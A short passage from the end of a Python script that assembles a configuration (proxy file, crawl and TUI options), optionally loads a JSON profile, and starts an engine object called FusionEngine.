        "proxy_file": args.proxy_file,
        "no_tui": args.no_tui,
        "crawl": args.crawl,
        "weights": {}  # default weights will be used
    }

    if args.profile:
        try:
            with open(args.profile, 'r') as f:
                profile = json.load(f)
                config.update(profile)
        except:
            log.error("Failed to load profile.")

    engine = FusionEngine(config)
    engine.start()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    main()
